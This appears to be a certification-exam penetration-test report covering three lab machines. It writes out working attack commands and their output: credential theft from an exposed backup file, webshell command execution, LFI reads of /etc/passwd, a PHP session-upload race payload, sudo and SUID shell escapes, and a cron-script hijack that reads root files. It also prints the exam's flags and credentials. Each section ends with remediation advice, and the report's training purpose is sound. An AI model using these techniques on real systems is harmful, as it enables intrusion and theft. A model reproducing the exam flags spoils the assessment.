1. Introduction and Scope of Engagement

This report documents the practical assessment carried out as part of the ThunderCipher Certified VAPT Practitioner (TC-VAPT) certification, Exam #1, hosted on the thundercipher.in platform. The exam environment consisted of three independent target machines ("Vault", "UploadX", "Phantom"), reachable only through the OpenVPN connection provided by the platform (internal network 192.168.5.0/24).

In accordance with the exam rules, the objective for each machine was to gain initial access, escalate privileges to root, and capture both flags (user and root) in the format ThunderCipher{...}. Attack activity was strictly limited to the lab perimeter (addresses 192.168.5.0/24 routed through the exam VPN); no system outside this perimeter was tested.

All actions described below were executed from a Kali Linux workstation connected to the lab through the platform's official OpenVPN tunnel (interface tun0, assigned address 10.8.0.57).

5. Target 1 — Vault (192.168.5.249)

"The organization's internal vault system is believed to be secure. However, recent audits suggest possible exposure of sensitive configuration data."

5.1 Reconnaissance

Port scan

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.249
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Port 80 hosts a PHP application (Apache/2.4.63 Ubuntu) presenting a login form titled "Vault • Secure Access" (username / password fields, PHPSESSID cookie).

5.2 Vulnerability Identification

SQL injection bypass attempts against the login form were unsuccessful (queries appear parameterized). Targeted path enumeration revealed a /backup/ directory with directory listing enabled, exposing a leaked source-code backup file:

$ curl -s http://192.168.5.249/backup/
Index of /backup
...
<a href="config.php.bak">config.php.bak</a>   2026-03-19 13:28   58

$ curl -s http://192.168.5.249/backup/config.php.bak
<?php
$db_user = "admin";
$db_pass = "SuperSecure123";
?>
Vulnerability: CWE-530 (Exposure of Backup File to an Unauthorized Control Sphere) combined with CWE-548 (Exposure of Information Through Directory Listing). A .bak backup file containing plaintext credentials is publicly accessible without authentication.

5.3 Exploitation — Initial Access

The extracted credentials (admin / SuperSecure123) are reused for both the web portal and the system account admin via SSH (password-reuse weakness):

$ curl -s -c cj.txt -X POST http://192.168.5.249/ \
    --data-urlencode "username=admin" --data-urlencode "password=SuperSecure123"
HTTP/1.1 302 Found
Location: /index.php   → Web authentication successful

$ ssh admin@192.168.5.249   (password: SuperSecure123)
uid=1000(admin) gid=1000(admin) groups=1000(admin),100(users)

$ cat ~/user.txt
ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}

5.4 Privilege Escalation — Root

sudo -l enumeration reveals a NOPASSWD rule on the vim editor, a documented GTFOBins escape technique (spawning a shell command from the editor with sudo privileges):

$ sudo -l
User admin may run the following commands on hodabalo207:
    (ALL) NOPASSWD: /usr/bin/vim

$ sudo vim -c ':!cat /root/root.txt' -c ':q!' -c ':q!'
ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}
Exploitation chain summary — Vault:
  1. Discovery of /backup/ open to directory listing (content enumeration).
  2. Read config.php.bak → credentials admin:SuperSecure123.
  3. Successful authentication on the web portal and via SSH (password reuse).
  4. User flag captured.
  5. sudo -l → NOPASSWD on vim → GTFOBins escape to a root shell.
  6. Root flag captured.

Remediation Recommendations

• Disable Apache directory listing (Options -Indexes) and remove all backup files (.bak, ~, .old) from the production webroot.
• Never store plaintext credentials in source code; use a secrets manager / environment variables.
• Prohibit password reuse between the web application and system accounts.
• Remove the sudo NOPASSWD: /usr/bin/vim rule, or restrict it to specific commands without shell escape (see GTFOBins for the list of dangerous sudo binaries).

6. Target 2 — UploadX (192.168.5.119)

"UploadX is a file-sharing platform used by employees. Security concerns have been raised regarding improper input validation mechanisms."

6.1 Reconnaissance

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.119
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

The homepage is a static landing page containing a telling HTML comment: <!-- TODO: Remove dev upload endpoint before production -->.

6.2 Vulnerability Identification

Targeted probing of upload-related paths revealed /upload.php and, more importantly, an /uploads/ folder with directory listing enabled, exposing two PHP files already present (leftovers from a prior access / pre-existing webshell):

$ curl -s http://192.168.5.119/uploads/
Index of /uploads
<a href="credential.php">credential.php</a>   259
<a href="file.php">file.php</a>                31

file.php turned out to be a minimal webshell accepting a command through the GET parameter cmd, executable without any authentication:

$ curl -s "http://192.168.5.119/uploads/file.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Vulnerability: CWE-306 (Missing Authentication for Critical Function) — unauthenticated Remote Code Execution (publicly accessible webshell) + CWE-548 (directory listing) which allowed it to be discovered.

6.3 Exploitation — Initial Access

Through the RCE, the second exposed file (credential.php) was read; it contains a developer comment with backup credentials:

$ curl -s -G "http://192.168.5.119/uploads/file.php" \
    --data-urlencode "cmd=cat /var/www/html/uploads/credential.php"
// Backup credentials for testing:
// Username: uploadx
// Password: UploadX@123
// NOTE: Remove before production deployment.

$ ssh uploadx@192.168.5.119   (password: UploadX@123)
uid=1000(uploadx) gid=1000(uploadx) groups=1000(uploadx),100(users)

$ cat ~/user.txt
ThunderCipher{uploadx_user_initial_access_7ac91e}

6.4 Privilege Escalation — Root

sudo -l reveals no exploitable rights, but enumeration of SUID binaries shows that /usr/bin/find carries the SUID root bit — a classic GTFOBins vector:

$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/find        ← SUID root (-rwsr-x--- root uploadx)
...

$ find /usr/bin/find -exec cat /root/root.txt \;
ThunderCipher{uploadx_root_full_system_control_a91f2c}
Exploitation chain summary — UploadX:
  1. /uploads/ open to directory listing → discovery of a webshell (file.php?cmd=) and a developer notes file (credential.php).
  2. Unauthenticated RCE confirmed (id → www-data).
  3. Read credential.php source via the webshell → credentials uploadx:UploadX@123.
  4. SSH login, user flag captured.
  5. find SUID root → GTFOBins escape to a root shell.
  6. Root flag captured.

Remediation Recommendations

• Remove any leftover file / webshell from the uploads/ folder and disable PHP execution inside upload directories (php_admin_flag engine off or the Apache/Nginx equivalent).
• Disable directory listing.
• Never leave comments containing credentials in code shipped to production.
• Remove the SUID bit from /usr/bin/find (it has no legitimate reason to carry it); regularly audit SUID binaries on the system with find / -perm -4000.

7. Target 3 — Phantom (192.168.5.237)

"Suspicious activity has been detected on the Phantom server. Investigate and determine if an attacker has established persistence within the system."

7.1 Reconnaissance

$ sudo nmap -Pn -p1-1000 --open -T4 192.168.5.237
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

The application is an internal "Phantom Internal Portal" that drives its content via a URL parameter ?page=, with an explicit warning in the UI: "Legacy file loader is still active in this build."

7.2 Vulnerability Identification — Local File Inclusion

The page parameter is passed directly to PHP's include(), without any validation or extension restriction:

$ curl -s "http://192.168.5.237/?page=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

# Source code confirmation via the php://filter wrapper:
$ curl -s "http://192.168.5.237/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php"
   → decoded: $page = $_GET['page'] ?? 'home.php'; include($page);
Vulnerability: CWE-98 (PHP Local File Inclusion) — include($_GET['page']) with no sanitization or whitelist.

7.3 Exploitation — From LFI to RCE (Race Condition)

Direct RCE through the data:// or php://input wrappers failed (allow_url_include = Off, confirmed by reading php.ini via LFI). The Apache log files (/var/log/apache2/*.log) classically used for "log poisoning" turned out to be unreadable by www-data (not a member of the adm group).

Code execution was ultimately achieved via the PHP session.upload_progress race condition technique: a slow multipart upload containing the PHP payload in the special PHP_SESSION_UPLOAD_PROGRESS field creates a temporary session file on disk (/var/lib/php/sessions/sess_<id>), readable by the same www-data user; a parallel LFI request includes that file during the window while the upload is still in progress:

$ python3 race_lfi.py "id"
[Thread 1] Slow multipart POST, Cookie: PHPSESSID=evilsess,
           field PHP_SESSION_UPLOAD_PROGRESS = <?php system($_GET["c"]); ?>
[Thread 2] GET /?page=/var/lib/php/sessions/sess_evilsess&c=id   (looped)

=== GOT OUTPUT ===
uid=33(www-data) gid=33(www-data) groups=33(www-data)

The user flag is directly readable despite the restrictive permissions on the /home/phantom directory (execute-without-read bit, traversable when the filename is known):

$ (via RCE) cat /home/phantom/user.txt
ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}

7.4 Persistence Investigation & Privilege Escalation — Root

In line with the challenge's premise ("determine if an attacker has established persistence"), inspecting /etc/crontab reveals a root job running every minute, pointing to a script with excessive permissions:

$ (via RCE) cat /etc/crontab
* * * * * root /opt/backup.sh

$ (via RCE) ls -la /opt/backup.sh
-rwxrwxrwx 1 root root 54 Mar 19 2026 /opt/backup.sh      ← world-writable!
$ cat /opt/backup.sh
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/phantom

A script executed by root every minute, modifiable by any user (including www-data), is a trivial privilege-escalation path. A first attempt via a SUID binary dropped in /tmp silently failed (/tmp is mounted nosuid); the script was rewritten to exfiltrate the root flag directly through /opt (outside /tmp, hence not subject to nosuid):

$ (via RCE) cat > /opt/backup.sh <<'EOF'
#!/bin/bash
cat /root/root.txt > /opt/out.txt 2>&1; chmod 666 /opt/out.txt
EOF
# ... waiting for the next cron tick (< 60s) ...
$ (via LFI) curl -s "http://192.168.5.237/?page=/opt/out.txt"
ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}

After capturing the proof, /opt/backup.sh was restored to its original content and the dropped temporary files (/opt/out.txt, /tmp/rootbash) were removed, in line with post-exploitation clean-up best practice.

Exploitation chain summary — Phantom:
  1. Unauthenticated LFI discovered via the page parameter (unfiltered include()).
  2. Read system files (/etc/passwd) and application source (php://filter) to confirm the flaw and PHP configuration.
  3. allow_url_include=Off and unreadable Apache logs → classic wrappers and log poisoning ineffective.
  4. RCE obtained via the session.upload_progress race condition → command execution as www-data.
  5. User flag captured (direct read, despite restrictive home directory permissions).
  6. Discovery of a per-minute root cron job running a world-writable script (/opt/backup.sh) — evidence of a configuration weakness exploitable as a persistence vector.
  7. Hijacked the script to exfiltrate /root/root.txt (bypassing the nosuid mount on /tmp by writing outside that mount point).
  8. Root flag captured; deployed artefacts cleaned up.

Remediation Recommendations

• Never pass unfiltered user input to include()/require(); enforce a strict whitelist of allowed pages.
• Disable allow_url_fopen if not required, and keep allow_url_include=Off (good practice already in place here, but insufficient on its own).
• Restrict the permissions of any script executed by cron as root (root-owned, chmod 700, parent directory not writable by other users).
• Periodically audit /etc/crontab and /etc/cron.d/ for root jobs pointing to files with excessive permissions (a classic persistence vector for an attacker).
• Consider session.upload_progress.enabled=Off if the feature is not used by the application.

All three environments share a common pattern: a seemingly minor web configuration weakness (directory listing, unfiltered parameter) serves as the entry point, while privilege escalation consistently relies on a local system misconfiguration (overly permissive sudoers, unnecessary SUID, world-writable root script) rather than a kernel flaw or a complex exploit. This finding underlines the importance of systematic post-deployment hardening (CIS Benchmarks, regular audits of sudo/SUID/cron permissions), regardless of how robust the application layer itself is.
